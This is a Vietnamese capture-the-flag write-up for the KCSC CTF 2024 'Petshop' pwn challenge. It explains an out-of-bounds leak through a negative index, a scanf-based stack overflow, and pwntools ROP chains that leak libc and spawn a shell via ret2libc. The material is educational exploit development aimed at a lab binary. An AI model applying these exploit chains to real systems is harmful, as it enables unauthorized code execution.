---
title: Write-up PWN KCSC CTF 2024
date: 2024-05-13 15-01-56
categories: [CTF]
tags: [pwn, KCSC]
image: /assets/image/kcsc.png
math: true
---

## Petshop

### Ý tưởng

- Sử dụng OOB để leak exe.address --> sử dụng bug fmt của `scanf` để BOF leak libc.address --> tiếp tục sử dụng bug fmt của `scanf` để ret2libc

### Phân tích

#### Leak exe.address

- Ở chall này, thì đầu tiên ta có bug OOB ở hàm `buy`

```c
int v6; // [rsp+1Ch] [rbp-424h] BYREF
...
if ( (unsigned int)__isoc99_sscanf(a1, "%3s %d", s1, &v6) != 2 )
...
if ( v6 > 3 )
    {
      puts("Invalid type of dog!");
      v2 = pet_list;
      pet_list[pet_count] = 0LL;
      return (int)v2;
    }
    *(_QWORD *)pet_list[pet_count] = (&dogs)[v6];// leak
```

- Chall không check điều kiện `v6 < 0` nên ta có thể tìm con trỏ để leak exe.address và có 1 con trỏ chúng ta có thể sử dụng được

![](/assets/2024-05-13-Write-up%20PWN%20KCSC%20CTF%202024/2024-05-13-15-27-32.png)

```c
buy(-2)
infoo()
p.recvuntil(b'1. ')
exe.address = u64(p.recv(6) + b'\0\0') - 0x4008
info("exe.address " + hex(exe.address))
```

#### Leak libc.address bằng BOF ở bug fmt của scanf

- Sau khi mình tìm hiểu ở [pwn> scanf and hateful dot](https://rehex.ninja/posts/scanf-and-hateful-dot/) thì mình hiểu như sau. Với `%d` và mình sử dụng `.` thì sẽ không ghi vào biến. Nghĩa là nếu lần đầu tiên mình sửa dụng `scanf` nhập vào `1234` và lần thứ hai mình nhập `.` thì biến đó vẫn có giá trị là `1234`

```c
pop_rdi = exe.address + 0x0000000000001a13
buy(0)
sell(0)
sla(b'You    --> ', str(0x300))
sell(1)
sa(b'You    --> ', '.')
sla(b'You    --> ', b'a'*0x200 + flat(0, pop_rdi,
    exe.got.puts, exe.plt.puts, exe.sym.main))
p.recvuntil(b'That seems reasonable!\n')
libc.address = u64(p.recv(6) + b'\0\0') - libc.sym.puts
info("libc.address: " + hex(libc.address))
```

#### RET2LIBC

```c
buy(-2)
buy(0)
sell(2)
sla(b'You    --> ', str(0x300))
sell(3)
sa(b'You    --> ', '.')
sla(b'You    --> ', b'a'*0x200 + flat(0, pop_rdi+1, pop_rdi,
    next(libc.search(b'/bin/sh')), libc.sym.system))
```
